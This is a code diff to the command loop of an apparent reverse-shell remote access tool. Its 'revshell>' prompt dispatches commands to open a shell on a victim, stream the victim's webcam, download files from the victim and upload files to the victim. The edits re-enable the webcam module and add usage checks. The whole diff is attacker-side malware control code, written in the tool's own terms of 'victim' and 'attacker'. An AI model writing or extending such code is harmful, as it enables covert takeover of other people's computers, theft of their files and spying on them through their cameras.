@@ -1,6 +1,6 @@
 from server import Server
 from prompt import InteractivePrompt
-# from webcam import Webcam
+from webcam import Webcam
 from shell import Shell
 from transfer import FileTransfer
 from outputs import Output
@@ -21,8 +21,6 @@ def parse_command(command, server):
 def main_loop(server):
 	while True:
 		# signal.signal(signal.SIGINT, sigIntHandler)
-		client_socket = server.get_client_socket()
-		
 		prompt = InteractivePrompt()
 		cmd = prompt.input("revshell> ")
 		if not cmd:
@@ -32,14 +30,21 @@ def main_loop(server):
 		if cmd == "shell":
 			shell = Shell(server)
 			shell.listener()
+		# Rework webcam to be more comprehensible
 		elif cmd == "webcam":
-			webcam = Webcam(client_socket)
+			webcam = Webcam(server)
 			webcam.receive()
 		elif cmd == "download":
+			if len(args) != 2:
+				Output.error('Usage: download <file_of_victim> <path_of_attacker>')
+				continue
 			# Usage: download <file_of_victim> <path_of_attacker>
 			transfer = FileTransfer(server)
 			transfer.receive(args[1])
 		elif cmd == "upload":
+			if len(args) != 2:
+				Output.error('Usage: upload <file_of_attacker> <path_of_victim>')
+				continue
 			# Usage: upload <file_of_attacker> <path_of_victim>
 			transfer = FileTransfer(server)
 			if transfer.send(args[0]) == 1:
